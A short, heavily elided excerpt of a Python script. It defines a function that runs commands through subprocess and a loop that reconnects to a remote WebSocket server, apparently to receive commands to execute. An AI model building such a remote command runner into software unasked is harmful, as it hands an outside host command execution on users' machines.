...
def run_command(command_to_run):
    try:
        ...
        res = subprocess.run(command_list, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
...
if __name__ == "__main__":
    ...
    while True:
        try:
            ws = websocket.WebSocketApp("wss://asset.certiplate.com/servers/connect/tanweer/",
